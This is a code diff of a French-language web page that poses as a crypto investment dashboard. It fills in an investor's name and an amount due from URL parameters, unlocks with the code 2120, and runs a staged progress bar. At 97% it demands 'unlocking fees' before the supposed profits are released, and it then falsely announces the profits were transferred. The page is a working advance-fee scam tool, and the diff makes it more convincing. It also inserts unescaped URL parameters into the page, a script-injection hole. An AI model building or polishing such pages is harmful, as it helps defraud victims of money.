@@ -17,9 +17,9 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: url('./nano.png'); /* Chemin relatif */
+            background-image: url('./nano.png'); 
             background-size: cover;
-            z-index: -1; /* Place l'image en arrière-plan */
+            z-index: -1; 
         }
 
         body {
@@ -38,7 +38,7 @@
         .interface {
             text-align: center;
             padding: 20px;
-            background-color: rgba(255, 255, 255, 0.5); /* Couleur blanche avec une opacité de 50% */
+            background-color: rgba(255, 255, 255, 0.5); 
             color: #000000;
             border-radius: 30px;
             box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
@@ -63,7 +63,7 @@
             border-radius: 10px;
             overflow: hidden;
             position: relative;
-            margin: 0 auto; /* Centrer la barre de progression */
+            margin: 0 auto;
         }
 
         .progress {
@@ -75,7 +75,7 @@
             top: 0;
             left: 0;
             transition: width 1s ease;
-            z-index: 1; /* Assure que la barre de progression soit en-dessous du pourcentage */
+            z-index: 1; 
         }
 
         .progress-percent {
@@ -83,10 +83,10 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            z-index: 2; /* Assure que le pourcentage soit au-dessus de la barre de progression */
+            z-index: 2; 
         }
 
-        .button-demarrer {
+        .button-debloquer {
             background-color: #4da6e6;
             color: #ffffff;
             border: none;
@@ -96,7 +96,7 @@
             transition: background-color 0.3s ease;
         }
 
-        .button-demarrer:hover {
+        .button-debloquer:hover {
             background-color: #368ec4;
         }
 
@@ -111,6 +111,7 @@
     </style>
 </head>
 <body>
+    <img src="./sss.png" alt="Image" class="top-left-image"> 
     <div id="investor-info" class="interface"></div>
     <div class="background-image"></div>
     <div class="interface">   
@@ -125,45 +126,62 @@
         </div><br>
         <div><p style="color: #8B0000; font-weight: bold;" id="alert-msg"></p></div>  
         <div class="transfer-text"></div>
-        <input type="button" value="Démarrer" class="button-demarrer" id="btn-deblock">
+        <input type="button" value="Débloquer" class="button-debloquer" id="btn-deblock">
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
 
-        // Récupération des valeurs des paramètres
         const investorName = urlParams.get('investorName');
         const transactionNumber = urlParams.get('transactionNumber');
         const network = urlParams.get('network');
         const totalAmount = urlParams.get('totalAmount');
         const alertMessage = urlParams.get('alertMessage');
 
-        // Affichage des valeurs dans l'interface client
         document.getElementById('investor-info').innerHTML = `
             <div class="transfer-text">Nom de l'investisseur : ${investorName}</div>
             <div class="transfer-text">Numéro de transaction : ${transactionNumber}</div>
             <div class="transfer-text">Réseau utilisé : ${network}</div>
             <div class="transfer-text">Montant total à recevoir : ${totalAmount}</div>
         `;
+
         document.querySelector('#btn-deblock').addEventListener('click', () => {
-            let code2 = prompt("Veuillez entrer le code pour débloquer")
-            if(code2 == "2120"){
-                interval = setInterval(progress, 8500); // Change speed here
-                document.querySelector('#invest').innerText = "En cours d'investissement..."
-            }else{
-                alert("Code incorrect")
+            let code2 = prompt("Veuillez entrer le code pour débloquer");
+            if (code2 == "2120") {
+                interval = setInterval(progress, 140);
+                document.querySelector('#invest').innerText = "En cours d'investissement...";
+                changeButtonToReceive();
+            } else {
+                alert("Code incorrect");
             }
+        });
 
-        })
+        function changeButtonToReceive() {
+            const button = document.querySelector('#btn-deblock');
+            button.value = "Recevoir mes bénéfices";
+            button.removeEventListener('click', () => {
+                let code2 = prompt("Veuillez entrer le code pour débloquer");
+                if (code2 == "2120") {
+                    interval = setInterval(progress, 140);
+                    document.querySelector('#invest').innerText = "En cours d'investissement...";
+                    changeButtonToReceive();
+                } else {
+                    alert("Code incorrect");
+                }
+            });
 
-        // Animation de la barre de progression
+            button.addEventListener('click', () => {
+                alert('Vos bénéfices ont été transférés!');
+            });
+        }
+
         const progressBar = document.querySelector('.progress');
         const progressPercent = document.querySelector('.progress-percent');
         let percent = 0;
         let interval;
 
         function progress() {
-            if (percent <= 97) {
+            if (percent <= 99) {
                 progressBar.style.width = percent + '%';
                 progressPercent.textContent = percent + '%';
                 percent++;
@@ -172,10 +190,9 @@
             }
 
             if (percent == 97) {
-                document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme '+ investorName +' veuillez payer les frais de deblocage de votre investissement';
+                document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme ' + investorName + ' Veuillez payer les frais de déblocage pour entrer en possession de vos bénéfices.';
             }
         }
-
     </script>
 </body>
 </html>
